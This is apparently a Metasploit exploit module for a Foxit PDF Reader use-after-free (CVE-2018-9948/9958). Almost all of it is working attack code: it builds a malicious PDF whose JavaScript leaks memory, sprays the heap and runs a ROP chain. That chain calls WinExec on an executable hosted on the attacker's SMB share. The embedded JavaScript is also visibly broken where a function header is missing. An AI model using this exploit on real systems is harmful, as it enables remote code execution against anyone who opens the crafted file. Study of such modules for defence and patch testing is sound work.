# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039; => &#039;Foxit PDF Reader Pointer Overwrite UAF&#039;,
      &#039;Description&#039; => %q{
        Foxit PDF Reader v9.0.1.1049 has a Use-After-Free vulnerability
        in the Text Annotations component and the TypedArray&#039;s use
        uninitialized pointers.

        The vulnerabilities can be combined to leak a vtable memory address,
        which can be adjusted to point to the base address of the executable.
        A ROP chain can be constructed that will execute when Foxit Reader
        performs the UAF.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;mr_me&#039;,            # Use-after-free and PoC
          &#039;bit from meepwn&#039;,  # Uninitialized pointer
          &#039;saelo&#039;,            # JavaScript Garbage Collector
          &#039;Jacob Robles&#039;      # Metasploit Module
        ],
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2018-9948&#039;],
          [&#039;CVE&#039;, &#039;2018-9958&#039;],
          [&#039;ZDI&#039;, &#039;18-332&#039;],
          [&#039;ZDI&#039;, &#039;18-342&#039;],
          [&#039;URL&#039;, &#039;https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html&#039;],
          [&#039;URL&#039;, &#039;https://srcincite.io/pocs/cve-2018-9958.pdf.txt&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => true,
          &#039;FILENAME&#039; => &#039;test.pdf&#039;,
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039; =>
        [
          [&#039;Windows 10 Pro x64 Build 17134&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 20 2018&#039;,
      &#039;DefaultTarget&#039; => 0))

    register_options([
      OptString.new(&#039;EXENAME&#039;, [false, &#039;EXE file to download&#039;, &#039;&#039;]),
      OptString.new(&#039;SHARE&#039;, [false, &#039;SMB share hosting exe&#039;, &#039;&#039;])
    ])
  end

  def pdfdoc
    share = datastore[&#039;SHARE&#039;].empty? ? "#{Rex::Text.rand_text_alpha_lower(1)}" : datastore[&#039;SHARE&#039;]
    fname = datastore[&#039;EXENAME&#039;].empty? ? "#{Rex::Text.rand_text_alpha_lower(1)}.exe" : datastore[&#039;EXENAME&#039;]
    fname << &#039;.exe&#039; unless fname.ends_with?(&#039;.exe&#039;)

    share_path = "\\\\#{datastore[&#039;LHOST&#039;]}\\#{share}\\#{fname}"
    num = 4 - (share_path.length % 4)
    share_path << "\x00"*num
    return nil if share_path.length > 44

    print_status("share_path: #{share_path}")

    rop = &#039;&#039;
    max_index = 0
    share_path.unpack(&#039;V*&#039;).each_with_index {|blk, index|
      rop << "\nrop[0x%02x] = 0x%08x" % [index+12, blk]
      max_index = index
    }

    (max_index+1).upto(10) {|i| rop << "\nrop[0x%02x] = 0x00000000" % (i+12)}

    <<~PDFDOC
%PDF
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (

var heap_ptr   = 0;
var foxit_base = 0;
var pwn_array  = [];

    var arr = new Array(size);
    for(var i = 0; i < size; i++){
        arr[i] = this.addAnnot({type: "Text"});;
        if (typeof arr[i] == "object"){
            arr[i].destroy();
        }
    }
}

function gc() {
    const maxMallocBytes = 128 * 0x100000;
    for (var i = 0; i < 3; i++) {
        var x = new ArrayBuffer(maxMallocBytes);
    }
}

function alloc_at_leak(){
    for (var i = 0; i < 0x64; i++){
        pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));
    }
}

function control_memory(){
    for (var i = 0; i < 0x64; i++){
        for (var j = 0; j < pwn_array[i].length; j++){
            pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4
        }
    }
}

function leak_vtable(){
    var a = this.addAnnot({type: "Text"});

    a.destroy();
    gc();

    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    var leaked = stolen[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
}

function leak_heap_chunk(){
    var a = this.addAnnot({type: "Text"});
    a.destroy();

    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    alloc_at_leak();
    heap_ptr = stolen[1];
}

function reclaim(){
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x60);
        var rop = new Int32Array(arr[i]);

        rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
        rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
        rop[0x02] = 0x72727272;              // junk
        rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
        rop[0x04] = 0xffffffff;              // ret of WinExec
        rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
        rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
        rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
        rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
        rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
        rop[0x0a] = foxit_base + 0x0041c6ca; // ret
        rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret
        #{rop}
        rop[0x17] = 0x00000000;              // adios, amigo
    }
}

function trigger_uaf(){
    var that = this;
    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
    var arr = [1];
    Object.defineProperties(arr,{
        "0":{
            get: function () {

                that.getAnnot(0, "uaf").destroy();

                reclaim();
                return 1;
            }
        }
    });

    a.point = arr;
}

function main(){
    leak_heap_chunk();
    leak_vtable();
    control_memory();
    trigger_uaf();
}

if (app.platform == "WIN"){
    if (app.isFoxit == "Foxit Reader"){
        if (app.appFoxitVersion == "9.0.1.1049"){
            main();
        }
    }
}

)>> trailer <</Root 1 0 R>>
    PDFDOC
  end

  def exploit
    mypdf = pdfdoc
    if mypdf.nil?
      fail_with(Failure::BadConfig, &#039;The generated share path was greater than 44 bytes.&#039;)
    end
    file_create(mypdf)
  end
end

